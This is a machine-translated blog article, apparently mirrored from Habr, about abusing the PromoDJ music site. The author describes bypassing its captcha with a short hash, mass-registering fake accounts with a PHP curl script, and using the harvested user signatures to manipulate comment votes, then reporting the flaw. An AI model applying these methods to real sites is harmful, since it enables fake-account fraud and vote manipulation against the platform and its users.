<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Using PromoDJ for Equity</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Good day. I want to share a story that happened to me just yesterday, but about everything in order. 



 Content 


 1. Introduction 2. Possible acti...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Using PromoDJ for Equity</h1><div class="post__text post__text-html js-mediator-article"><img src="http://i.cdn.promodeejay.net/logo/promodj_small.gif" alt="image" align="left">  Good day.  I want to share a story that happened to me just yesterday, but about everything in order. <br><br><a name="habracut"></a><br><br><h4>  Content </h4><br><pre>  1. Introduction
 2. Possible activities
	 2.1.  Cheating the value of the promos
	 2.2.  Spam
	 2.3.  Vote for comments
 3. Methods of implementation
 4. Preparation for registration of accounts
	 4.1.  basic information
	 4.2.  Captcha
	 4.3.  E-mail Addresses
	 4.4.  Constants
 5. Scripts and their work
	 5.1.  Account Registrar
	 5.2.  Authorizer
	 5.3.  Get user signatures
	 5.4.  Shell for working with user signatures
 6. Conclusion
	 6.1.  Work results
	 6.2.  PromoDJ Administration Reaction
	 6.3.  The last word
 7. Toolkit </pre><br><h4>  Introduction </h4><br>  I think many of you know about the existence of the PromoDJ portal (abbreviated as PDJ), who do not know him - that's okay, now I will explain everything.  The site is a social network for musicians and DJs, photographers and singers, and there are many more for whom, where each of them can post their material for evaluation, and registered users can rate and discuss this very material.  PDJ is a great platform for a beginner music project, so we are registered there. 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      By nature, I am a very curious person, I was always interested to know what and how it works, where there are some security holes and how it can be used, there was free time, therefore PDJ was chosen as an object for study.  But before starting the research, I sat down and thought, - And what benefits can be obtained from this? <br><br>  For myself, I identified several areas: <ol><li>  Cheating the values ‚Äã‚Äãof the promos; </li><li>  Spam; </li><li>  Vote for comments. </li></ol>  I must say that I stopped at the last, but I will describe all the directions. <br><br><h4>  Possible activities </h4><br><h5>  Cheating the value of the promos </h5><br>  Promo is a personal cool rating, it is used to form a general top of artists, a top in styles and activities.  Cheating this value would not have given us anything: the quality of the music will remain the same, the ideology will not add to this, the number of visitors and auditions too, and after the recent innovations on the PDJ, it became theoretically impossible to wind the rating.  The fact is that recently, in order to vote for an artist, thereby increasing his promotions, you need to authorize your account, for this you need to specify your mobile number to which the coded code will come. <br><img src="https://habrastorage.org/storage1/9ab5e044/85157bc8/fc794758/98ba70f5.gif"><br><br><h5>  Spam </h5>  Added this activity only to have more points.  I do not like spam, and you, I think, also, therefore, I do not consider spamming, and in general I consider that this is the dirtiest and lowest matter. <br><img src="https://habrastorage.org/storage1/66960a88/ed3e0c3a/1fab741c/79d67d70.gif"><br><br><h5>  Vote for comments </h5><br>  PromoDJ is, first of all, a social network, here people are free to express their opinions and attitudes through comments, blog posts and the evaluation of comments. <br><br>  After I thought about the evaluation of comments, I seemed to look at everything that happens from a different angle.  Recently, I began to meet discussions on the PDJ forums, where a particular user unfairly received cons for his comments, not one, not two, but 20 pieces, after which inappropriate users, without reading the discussion text, picked up the baton and continued to put minuses and harmless comment went for -100.  After these thoughts, I decided to become Superman, to become Batman and Robin in one person, Jeims Bond with a license to change the rating of comments, a fighter for justice, horror, flying on the wings of the night, bringing retribution in the name of the Moon. <br><br>  A vivid example of an adequate and perfectly true (from the discussion) comment: <img src="https://habrastorage.org/storage1/f6f4a0eb/b1ae1443/bcf83a97/0963e8c5.gif"><br>  A little later, the same comment: <img src="https://habrastorage.org/storage1/5e2e3dda/b2725ea5/74dd3f86/f7b58109.gif"><br><br><h4>  Ways of implementation </h4><br>  Before you start running around the city in swimming trunks, a mask and a black raincoat, I decided to study how you can realize your plans and which side should approach this.  At that time, I knew for sure that the request, to increase or decrease the comment rating, comes without reloading the pages, which means that some javascript library was used, which formed and sent the post, or maybe get, a request to the server PDJ. <br><br>  Let's look a little closer: <img src="https://habrastorage.org/storage1/2577cff2/fc6f9b3c/5c010b9d/7bd72c7a.png"><br>  The following parameters are passed in the POST request: <br><img src="https://habrastorage.org/storage1/9c981e70/c3160027/35e98cab/f3879083.png"><br><br>  Where, digest is a unique, for each registered user, parameter (in some cases, I will call it a signature), which consists of an id-user and thirty-two character hash;  commentID - number of the comment;  vote - rating mode, ‚Äú1‚Äù - plus a comment, ‚Äú-1‚Äù - minus a comment. <br><br>  Next, I ended the user's session on the site and tried to vote for some comment, which, in fact, I succeeded.  For me, this meant a lot, now, for example, I knew that I would not have to log in to the site to give a vote for this or that comment, everything was done in one request with three parameters. <br><br>  All the necessary knowledge was obtained, but there was a question about digest - unique user identifiers, voices were not passed on invalid signatures, and with the help of one signature you can vote for the selected comment only once.  The only way out that I found was to register a few dummies for using their signatures for voting. <br><br><h4>  Preparation for registration of accounts </h4><br><h5>  basic information </h5><br>  The registration page, on PromoDJ, looks very massive, all sorts of items, input elements, select boxes and checkboxes.  Empirically, I quickly determined which parameters to pass to successfully register, they turned out to be: <br><blockquote>  <font color="#000088">$ postfiends</font> <font color="#339933">=</font> <font color="#990000">array</font> <font color="#009900">(</font> <br>  <font color="#0000ff">"row [login]"</font> <font color="#339933">=&gt;</font> <font color="#0000ff">""</font> <font color="#339933">,</font> <font color="#666666">// login</font> <br>  <font color="#0000ff">"row [password1]"</font> <font color="#339933">=&gt;</font> <font color="#0000ff">""</font> <font color="#339933">,</font> <font color="#666666">// password</font> <br>  <font color="#0000ff">"row [password2]"</font> <font color="#339933">=&gt;</font> <font color="#0000ff">""</font> <font color="#339933">,</font> <font color="#666666">// password, again</font> <br>  <font color="#0000ff">"row [email]"</font> <font color="#339933">=&gt;</font> <font color="#0000ff">""</font> <font color="#339933">,</font> <font color="#666666">// e-mail</font> <br>  <font color="#0000ff">"row [i]"</font> <font color="#339933">=&gt;</font> <font color="#0000ff">""</font> <font color="#339933">,</font> <font color="#666666">// name</font> <br>  <font color="#0000ff">"row [f]"</font> <font color="#339933">=&gt;</font> <font color="#0000ff">""</font> <font color="#339933">,</font> <font color="#666666">// last name</font> <br>  <font color="#0000ff">"row [sex]"</font> <font color="#339933">=&gt;</font> <font color="#0000ff">""</font> <font color="#339933">,</font> <font color="#666666">// gender, can be man or woman</font> <br>  <font color="#0000ff">"row [iam_clubber]"</font> <font color="#339933">=&gt;</font> <font color="#0000ff">"1"</font> <font color="#339933">,</font> <font color="#666666">// status: clubber</font> <br>  <font color="#0000ff">"row [iam_listener]"</font> <font color="#339933">=&gt;</font> <font color="#0000ff">"1"</font> <font color="#339933">,</font> <font color="#666666">// status: listener</font> <br>  <font color="#0000ff">"crow [company_kind]"</font> <font color="#339933">=&gt;</font> <font color="#0000ff">"none"</font> <font color="#339933">,</font> <font color="#666666">// no, I do not represent the company</font> <br><br>  <font color="#0000ff">"crow [title]"</font> <font color="#339933">=&gt;</font> <font color="#0000ff">""</font> <font color="#339933">,</font> <font color="#666666">// name of organization</font> <br>  <font color="#0000ff">"crow [countryID]"</font> <font color="#339933">=&gt;</font> <font color="#0000ff">"3159"</font> <font color="#339933">,</font> <font color="#666666">// country code</font> <br>  <font color="#0000ff">"crow [regionID]"</font> <font color="#339933">=&gt;</font> <font color="#0000ff">"0"</font> <font color="#339933">,</font> <font color="#666666">// region code (not specified)</font> <br>  <font color="#0000ff">"crow [cityID]"</font> <font color="#339933">=&gt;</font> <font color="#0000ff">"0"</font> <font color="#339933">,</font> <font color="#666666">// city code (not specified)</font> <br>  <font color="#0000ff">"crow [metroID]"</font> <font color="#339933">=&gt;</font> <font color="#0000ff">"0"</font> <font color="#666666">// subway station code (not specified)</font> <br>  <font color="#0000ff">"crow [street]"</font> <font color="#339933">=&gt;</font> <font color="#0000ff">""</font> <font color="#339933">,</font> <font color="#666666">// street, house</font> <br>  <font color="#0000ff">"crow [tel]"</font> <font color="#339933">=&gt;</font> <font color="#0000ff">""</font> <font color="#339933">,</font> <font color="#666666">// contact phone</font> <br>  <font color="#0000ff">"crow [fax]"</font> <font color="#339933">=&gt;</font> <font color="#0000ff">""</font> <font color="#339933">,</font> <font color="#666666">// fax</font> <br>  <font color="#0000ff">"crow [www]"</font> <font color="#339933">=&gt;</font> <font color="#0000ff">""</font> <font color="#339933">,</font> <font color="#666666">// site</font> <br><br>  <font color="#0000ff">"row [styleID]"</font> <font color="#339933">=&gt;</font> <font color="#0000ff">""</font> <font color="#339933">,</font> <font color="#666666">// I like the style most (code from the list)</font> <br>  <font color="#0000ff">"row [nick]"</font> <font color="#339933">=&gt;</font> <font color="#0000ff">""</font> <font color="#339933">,</font> <font color="#666666">// nickname</font> <br>  <font color="#0000ff">"row [title]"</font> <font color="#339933">=&gt;</font> <font color="#0000ff">""</font> <font color="#339933">,</font> <font color="#666666">// address of the page on promodj.ru</font> <br>  <font color="#0000ff">"row [about]"</font> <font color="#339933">=&gt;</font> <font color="#0000ff">""</font> <font color="#339933">,</font> <font color="#666666">// about yourself</font> <br>  <font color="#0000ff">"row [icq]"</font> <font color="#339933">=&gt;</font> <font color="#0000ff">""</font> <font color="#339933">,</font> <font color="#666666">// icq</font> <br>  <font color="#0000ff">"row [skype]"</font> <font color="#339933">=&gt;</font> <font color="#0000ff">""</font> <font color="#339933">,</font> <font color="#666666">// skype</font> <br>  <font color="#0000ff">"row [countryID]"</font> <font color="#339933">=&gt;</font> <font color="#0000ff">"3159"</font> <font color="#339933">,</font> <font color="#666666">// country code</font> <br>  <font color="#0000ff">"row [regionID]"</font> <font color="#339933">=&gt;</font> <font color="#0000ff">"0"</font> <font color="#339933">,</font> <font color="#666666">// region code (not specified)</font> <br>  <font color="#0000ff">"row [cityID]"</font> <font color="#339933">=&gt;</font> <font color="#0000ff">"0"</font> <font color="#339933">,</font> <font color="#666666">// city code (not specified)</font> <br>  <font color="#0000ff">"row [metroID]"</font> <font color="#339933">=&gt;</font> <font color="#0000ff">"0"</font> <font color="#339933">,</font> <font color="#666666">// metro station code (not specified)</font> <br>  <font color="#0000ff">"row [invite]"</font> <font color="#339933">=&gt;</font> <font color="#0000ff">""</font> <font color="#339933">,</font> <font color="#666666">// magic code</font> <br>  <font color="#0000ff">"row [agreed]"</font> <font color="#339933">=&gt;</font> <font color="#0000ff">"1"</font> <font color="#339933">,</font> <font color="#666666">// yes, I agree with the rules of the site</font> <br>  <font color="#0000ff">"respond"</font> <font color="#339933">=&gt;</font> <font color="#0000ff">""</font> <font color="#339933">,</font> <font color="#666666">// response to captcha</font> <br>  <font color="#0000ff">"key"</font> <font color="#339933">=&gt;</font> <font color="#0000ff">""</font> <font color="#666666">// hash captcha</font> <br>  <font color="#009900">)</font> <font color="#339933">;</font> </blockquote>  The choice of ‚Äúclubber‚Äù and ‚Äúlistener‚Äù statuses is not accidental, these statuses do not require confirmation from the administration, and this attention has nothing to do with.  For example, in order to go through the confirmation of the ‚Äúmusician‚Äù status, it is necessary to write in detail about their activities, it will be strange if the administration sees requests following each other with the same description. <br><br><h5>  Captcha </h5><br>  Going to the end of the questionnaire, the last item, we find the captcha, which meanly bends the text, making it difficult to static definition: <br><img src="https://habrastorage.org/storage1/e7cbceb4/3d88e2cb/de1a9ee0/ebcdf783.png"><br>  As I wrote above, in the request for registration, it is not only the response to the captcha that is transmitted as the hash itself.  The same hash is used to generate the image: <br> <code><a href=""></a> pdj.ru/captcha_big.gif?key=0ad241a541a4f2e8a7457138b6c2299e</code> <br> <br>  The hash is unique and you can register it only once, changing the hash leads to a change in the text in the picture.  Visually, I couldn‚Äôt manage to determine the algorithm for which I can get an answer to the captcha from the hash, so I suggested three further development steps: <ol><li>  Create a table consisting of a valid pair (hash + answer); </li><li>  Attempt to determine the algorithm for obtaining from the hash response; </li><li>  Search for the implementation of this type of captcha recognition. </li></ol>  Create a table consisting of a valid pair (hash + answer): very long and tedious, plus you have to write an additional script, this option can be considered only if there are volunteers to work. <br><br>  Trying to determine the algorithm for obtaining from the hash the answer: quite difficult to implement, or even impossible, because it can be used some kind of hashing algorithm, and even using salt.  Not an option. <br><br>  Search for the implementation of the captcha of this type: never worked and did not use such libraries, this option can be used. <br><br><img src="https://habrastorage.org/storage1/ef220ccb/775df6d1/38afd126/3e1a4550.png" align="left">  While I was arguing on this topic, I accidentally discovered that if the hash is less than 32 characters, then the picture will be with four zeros, having determined this, I just need to check whether the stub is worth this case for PDJ or not.  To do this, in the page code, I changed the necessary parameters and successfully registered a new account. <br><br><h5>  E-mail Addresses </h5><br>  I decided not to search for electronic mailboxes, not to write them myself and not to search for those who sell databases, not to send Trojans to friends and acquaintances, why?  Yandex will do everything for us. <img src="https://habrastorage.org/storage1/1e1593eb/bc944757/c603c4f3/cf60f870.png"><br><br><h5>  Constants </h5><br>  Almost everything is ready for registration of accounts, it remains to collect the missing data, namely: <ol><li>  List of names to register; </li><li>  Music style codes; </li><li>  A small user-agents-list. </li></ol>  As a list of names, I used a large database of nicks found on the Internet.  Other data: <blockquote>  <font color="#000088">$ uagents</font> <font color="#339933">=</font> <font color="#990000">array</font> <font color="#009900">(</font> <br>  <font color="#0000ff">"Opera / 9.20 (Windows NT 6.0; U; en)"</font> <font color="#339933">,</font> <br>  <font color="#0000ff">"Mozilla / 4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.50"</font> <font color="#339933">,</font> <br>  <font color="#0000ff">"Mozilla / 4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.1) Opera 7.02 [en]"</font> <font color="#339933">,</font> <br>  <font color="#0000ff">"Mozilla / 5.0 (Windows; U; Windows NT 5.1; en-US; rv: 1.7.5) Gecko / 20060127 Netscape / 8.1"</font> <font color="#339933">,</font> <br>  <font color="#0000ff">"Mozilla / 5.0 (X11; U; Linux i686; en-US; rv: 1.8.1.1) Gecko / 20061205 Iceweasel / 2.0.0.1 (Debian-2.0.0.1 + dfsg-2)"</font> <font color="#339933">,</font> <br>  <font color="#0000ff">"Opera / 10.00 (X11; Linux i686; U; en) Presto / 2.2.0"</font> <font color="#009900">)</font> <font color="#339933">;</font> <br><br>  <font color="#000088">$ styles</font> <font color="#339933">=</font> <font color="#990000">explode</font> <font color="#009900">(</font> <font color="#0000ff">";"</font> <font color="#339933">,</font> <font color="#0000ff">"88; 2; 4; 7; 6; 14; 31; 15; 18; 23; 25; 27; 28; 8; 24; 29; 30; 44; 46; 47; 49; 37; 1; 80; 16 "</font> <font color="#009900">)</font> <font color="#339933">;</font> </blockquote><br><br><h4>  Scripts and their work </h4><br><h5>  Account Registrar </h5><br><blockquote>  <font color="#990000">set_time_limit</font> <font color="#009900">(</font> <font color="#cc66cc">0</font> <font color="#009900">)</font> <font color="#339933">;</font> <br>  <font color="#000088">$ magic</font> <font color="#339933">=</font> <font color="#cc66cc">0</font> <font color="#339933">;</font> <br>  <font color="#000088">$ i</font> <font color="#339933">=</font> <font color="#cc66cc">1</font> <font color="#339933">;</font> <br><br>  <font color="#000088">$ fp</font> <font color="#339933">=</font> <font color="#990000">fopen</font> <font color="#009900">(</font> <font color="#0000ff">'names.txt'</font> <font color="#339933">,</font> <font color="#0000ff">'rb'</font> <font color="#009900">)</font> <font color="#339933">;</font> <br>  <font color="#b1b100">while</font> <font color="#009900">(</font> <font color="#009900">(</font> <font color="#000088">$ line</font> <font color="#339933">=</font> <font color="#339933">@</font> <font color="#990000">fgets</font> <font color="#009900">(</font> <font color="#000088">$ fp</font> <font color="#009900">)</font> <font color="#009900">)</font> <font color="#339933">! ==</font> <font color="#009900">false</font> <font color="#009900">)</font> <font color="#009900">{</font> <br>  <font color="#666666">// $ pdgparams = "";</font> <br>  <font color="#000088">$ postfiends</font> <font color="#009900">[</font> <font color="#0000ff">"row [login]"</font> <font color="#009900">]</font> <font color="#339933">=</font> <font color="#000088">$ postfiends</font> <font color="#009900">[</font> <font color="#0000ff">"row [password1]"</font> <font color="#009900">]</font> <font color="#339933">=</font> <font color="#000088">$ postfiends</font> <font color="#009900">[</font> <font color="#0000ff">"row [password2]"</font> <font color="#009900">]</font> <font color="#339933">=</font> <font color="#000088">$ postfiends</font> <font color="#009900">[</font> <font color="#0000ff">"row [nick]"</font> <font color="#009900">]</font> <font color="#339933">=</font> <font color="#000088">$ postfiends</font> <font color="#009900">[</font> <font color="#0000ff">"row [ title] "</font> <font color="#009900">]</font> <font color="#339933">=</font> <font color="#990000">trim</font> <font color="#009900">(</font> <font color="#000088">$ line</font> <font color="#009900">)</font> <font color="#339933">;</font> <br>  <font color="#000088">$ postfiends</font> <font color="#009900">[</font> <font color="#0000ff">"row [email]"</font> <font color="#009900">]</font> <font color="#339933">=</font> <font color="#000088">$ postfiends</font> <font color="#009900">[</font> <font color="#0000ff">"row [login]"</font> <font color="#009900">]</font> <font color="#339933">.</font>  <font color="#0000ff">"@ asdfghhgj.ru"</font> <font color="#339933">;</font> <br>  <font color="#000088">$ postfiends</font> <font color="#009900">[</font> <font color="#0000ff">"row [sex]"</font> <font color="#009900">]</font> <font color="#339933">=</font> <font color="#009900">(</font> <font color="#990000">rand</font> <font color="#009900">(</font> <font color="#cc66cc">0</font> <font color="#339933">,</font> <font color="#cc66cc">1</font> <font color="#009900">)</font> ? <font color="#0000ff">"man"</font> <font color="#339933">:</font> <font color="#0000ff">"woman"</font> <font color="#009900">)</font> <font color="#339933">;</font> <br>  <font color="#000088">$ postfiends</font> <font color="#009900">[</font> <font color="#0000ff">"row [styleID]"</font> <font color="#009900">]</font> <font color="#339933">=</font> <font color="#000088">$ styles</font> <font color="#009900">[</font> <font color="#990000">rand</font> <font color="#009900">(</font> <font color="#cc66cc">0</font> <font color="#339933">,</font> <font color="#990000">sizeof</font> <font color="#009900">(</font> <font color="#000088">$ styles</font> <font color="#009900">)</font> <font color="#339933">-</font> <font color="#cc66cc">1</font> <font color="#009900">)</font> <font color="#009900">]</font> <font color="#339933">;</font> <br>  <font color="#000088">$ postfiends</font> <font color="#009900">[</font> <font color="#0000ff">"key"</font> <font color="#009900">]</font> <font color="#339933">=</font> <font color="#000088">$ magic</font> <font color="#339933">+</font> <font color="#000088">$ i</font> <font color="#339933">;</font> <br><br>  <font color="#666666">// foreach ($ postfiends as $ key_name =&gt; $ key_value)</font> <br>  <font color="#666666">// $ pdgparams. = '&amp;'. $ key_name. '='. $ key_value;</font> <br><br>  <font color="#000088">$ ci</font> <font color="#339933">=</font> <font color="#990000">curl_init</font> <font color="#009900">(</font> <font color="#009900">)</font> <font color="#339933">;</font> <br>  <font color="#990000">curl_setopt</font> <font color="#009900">(</font> <font color="#000088">$ ci</font> <font color="#339933">,</font> CURLOPT_USERAGENT <font color="#339933">,</font> <font color="#000088">$ uagents</font> <font color="#009900">[</font> <font color="#990000">rand</font> <font color="#009900">(</font> <font color="#cc66cc">0</font> <font color="#339933">,</font> <font color="#990000">sizeof</font> <font color="#009900">(</font> <font color="#000088">$ uagents</font> <font color="#009900">)</font> <font color="#339933">-</font> <font color="#cc66cc">1</font> <font color="#009900">)</font> <font color="#009900">]</font> <font color="#009900">)</font> <font color="#339933">;</font> <br>  <font color="#990000">curl_setopt</font> <font color="#009900">(</font> <font color="#000088">$ ci</font> <font color="#339933">,</font> CURLOPT_CONNECTTIMEOUT <font color="#339933">,</font> <font color="#cc66cc">30</font> <font color="#009900">)</font> <font color="#339933">;</font> <br>  <font color="#990000">curl_setopt</font> <font color="#009900">(</font> <font color="#000088">$ ci</font> <font color="#339933">,</font> CURLOPT_TIMEOUT <font color="#339933">,</font> <font color="#cc66cc">30</font> <font color="#009900">)</font> <font color="#339933">;</font> <br>  <font color="#990000">curl_setopt</font> <font color="#009900">(</font> <font color="#000088">$ ci</font> <font color="#339933">,</font> CURLOPT_RETURNTRANSFER <font color="#339933">,</font> <font color="#009900">TRUE</font> <font color="#009900">)</font> <font color="#339933">;</font> <br>  <font color="#990000">curl_setopt</font> <font color="#009900">(</font> <font color="#000088">$ ci</font> <font color="#339933">,</font> CURLOPT_POST <font color="#339933">,</font> <font color="#009900">TRUE</font> <font color="#009900">)</font> <font color="#339933">;</font> <br>  <font color="#990000">curl_setopt</font> <font color="#009900">(</font> <font color="#000088">$ ci</font> <font color="#339933">,</font> CURLOPT_POSTFIELDS <font color="#339933">,</font> <font color="#000088">$ postfiends</font> <font color="#009900">)</font> <font color="#339933">;</font> <br>  <font color="#990000">curl_setopt</font> <font color="#009900">(</font> <font color="#000088">$ ci</font> <font color="#339933">,</font> CURLOPT_URL <font color="#339933">,</font> <font color="#0000ff">"pdj.ru/register/"</font> <font color="#009900">)</font> <font color="#339933">;</font> <br>  <font color="#990000">curl_exec</font> <font color="#009900">(</font> <font color="#000088">$ ci</font> <font color="#009900">)</font> <font color="#339933">;</font> <br>  <font color="#990000">curl_close</font> <font color="#009900">(</font> <font color="#000088">$ ci</font> <font color="#009900">)</font> <font color="#339933">;</font> <br><br>  <font color="#000088">$ i</font> <font color="#339933">++;</font> <br>  <font color="#990000">sleep</font> <font color="#009900">(</font> <font color="#990000">rand</font> <font color="#009900">(</font> <font color="#cc66cc">5</font> <font color="#339933">,</font> <font color="#cc66cc">25</font> <font color="#009900">)</font> <font color="#009900">)</font> <font color="#339933">;</font> <br>  <font color="#009900">}</font> </blockquote><br>  While the script is running, notifications of successful registration come: <br><img src="https://habrastorage.org/storage1/05d00ab7/326b4418/2b447cb2/b3551266.png"><br><img src="https://habrastorage.org/storage1/90943655/3802b144/82617863/e592b2e7.png"><br><br><h5>  Authorizer </h5><br>  In order not to arouse any suspicions at all and not to say goodbye in a moment to all the accounts, I decided to authorize everyone.  To do this, I exported all the letters from the email client, then pulled links from them and got a list of a huge number of records. <br><br><h5>  Get user signatures </h5><br>  The process of obtaining a signature consisted of several steps: <ol><li>  User authorization through the form on the login page; </li><li>  Go to PromoDJ home page; </li><li>  Extract the digest parameter from the page code. </li></ol>  This process took about two and a half - three hours, but there is a plus in this - I was never banned, I did not receive notifications from the administration about any violations and none of the accounts, for all the time, were deleted. <br><br><h5>  Shell for working with user signatures </h5><br>  To vote for comments, I made a convenient shell, where I could indicate the address of a comment and what to do with it - put a plus or a minus. <br><img src="https://habrastorage.org/storage1/0acb189b/3510b312/f8a170e8/d8ba76ce.png"><br><br>  On the settings page, you can specify the operation mode: <br><img src="https://habrastorage.org/storage1/dc1e6be3/ab90bade/275ab6a9/b37e1a12.png"><br>  In the automatic mode, after clicking on the ‚ÄúRun‚Äù button, all available hashes are voted for the specified comment. In manual mode, you can choose from the list any hash you like and vote on it: <br><img src="https://habrastorage.org/storage1/ddabf700/4b8b1736/ce7f8f26/3eb92196.png"><br><br><h4>  Conclusion </h4><br><h5>  Work results </h5><br><img src="https://habrastorage.org/storage1/9c9e5416/5f2353a5/b71c5840/5591629e.png"><br>  Randomized goodness and love was sown throughout PromoDJ. <br><br><h5>  PromoDJ Administration Reaction </h5><br>  After I sent a letter to the technical support of the portal, I could not even think that everything would end up being presented with a premium account and branding for their curiosity, which will come in very handy to our music project. <br><br><img src="https://habrastorage.org/storage1/60d42fd1/2e4193ff/f3c02855/bad63546.png"><br><br><h5>  The last word </h5><br>  The described vulnerability, due to which the registration of accounts was made, is closed a few minutes after my letter. <br><br>  Thank you for reading to the very end.  Good luck and see you in new articles! <br><br><h4>  Tools </h4><br>  In the process of work were used: <br><ul><li>  <a href="http://www.mpsoftware.dk/phpdesigner.php" title="phpDesigner">phpDesigner</a> </li><li>  <a href="http://jquery.com/" title="jQuery">jQuery</a> </li></ul></div><p>Source: <a href="https://habr.com/ru/post/129430/">https://habr.com/ru/post/129430/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../129419/index.html">Do you use "regular" software that is distributed with a laptop (PC)?</a></li>
<li><a href="../129424/index.html">Femtocells: own cell, its rules</a></li>
<li><a href="../129426/index.html">Theater of the absurd, or once again about the fiction "public domain"</a></li>
<li><a href="../129427/index.html">Microsoft, like Apple, refused to support Flash technology in the new browser Metro IE10, giving a similar argument</a></li>
<li><a href="../129428/index.html">Development details for GPUs in Visual Studio and C ++ AMP</a></li>
<li><a href="../129431/index.html">Presented budget smartphone HTC Explorer</a></li>
<li><a href="../129434/index.html">Hacby'11 web & mobile October 8-9, 2011 in Minsk</a></li>
<li><a href="../129437/index.html">The Foundry Nuke. Introduction</a></li>
<li><a href="../129439/index.html">Bandwidth limitation by time of day using ipfw</a></li>
<li><a href="../129440/index.html">Mail.Ru Agent + ICQ = interoperability</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>